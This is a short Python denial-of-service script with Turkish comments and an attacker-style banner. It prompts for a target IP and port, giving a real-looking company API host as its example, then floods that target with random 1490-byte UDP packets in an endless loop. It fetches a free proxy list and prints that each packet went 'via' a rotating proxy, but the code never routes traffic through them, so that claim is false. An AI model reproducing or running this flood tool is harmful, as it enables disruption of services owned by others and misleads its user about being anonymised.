import sys
import os
import time
import socket
import random
import requests
from datetime import datetime

# By Helcurt - Siber Boss Modu
# Ritim: GTA Diplo - Oh Boy 🎧

def get_proxies():
    print("\033[93m[+] Proxy listesi güncelleniyor (45 saniye kuralı aktif)...\033[0m")
    api_url = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=json"
    try:
        r = requests.get(api_url)
        if r.status_code == 200:
            data = r.json()
            # SOCKS5 ve HTTP proxylerini ayıkla
            proxy_list = [p['proxy'] for p in data['proxies']]
            print(f"\033[92m[+] {len(proxy_list)} adet taze proxy mühimmatı yüklendi!\033[0m")
            return proxy_list
    except:
        print("\033[91m[-] API bağlantı hatası! Yerel listeye dönülüyor...\033[0m")
        return []

def attack():
    os.system("clear")
    print("\033[91m")
    print("################################################")
    print("#          BY HELCURT - SIBER VIOLONET         #")
    print("#      'İhtiyar, bu senin kaderindi...'        #")
    print("################################################")
    
    target_ip = input("\033[93mHedef IP (örn: sgp-api.buy.mi.com): \033[0m")
    target_port = int(input("\033[93mHedef Port: \033[0m"))
    
    proxies = get_proxies()
    if not proxies:
        print("Proxy olmadan saldırı başlatılamaz!")
        return

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet_bytes = random._urandom(1490) # hammer.py mirası paket boyutu
    
    proxy_index = 0
    sent_packets = 0
    start_time = time.time()

    print(f"\033[92m\n[!] Taarruz başladı! Ritme odaklan... 🎧\033[0m")
    
    while True:
        try:
            # Her 45 saniyede bir listeyi tazeleme veya ban durumunda proxy değiştirme
            if time.time() - start_time > 45:
                proxies = get_proxies()
                start_time = time.time()
                proxy_index = 0

            current_proxy = proxies[proxy_index]
            
            # UDP Paket Gönderimi (Hammer Mantığı)
            sock.sendto(packet_bytes, (target_ip, target_port))
            sent_packets += 1
            
            print(f"\033[94m[{sent_packets}] Paket Gönderildi -> Proxy: {current_proxy}\033[0m", end="\r")
            
            # 10 saniyede bir veya ban simülasyonu durumunda proxy rotasyonu
            if sent_packets % 100 == 0:
                proxy_index = (proxy_index + 1) % len(proxies)
                
        except KeyboardInterrupt:
            print("\n\033[91m[!] Operasyon By Helcurt tarafından durduruldu.\033[0m")
            break
        except Exception as e:
            proxy_index = (proxy_index + 1) % len(proxies) # Banlanırsa ötekine geç!
            continue

if __name__ == "__main__":
    attack()
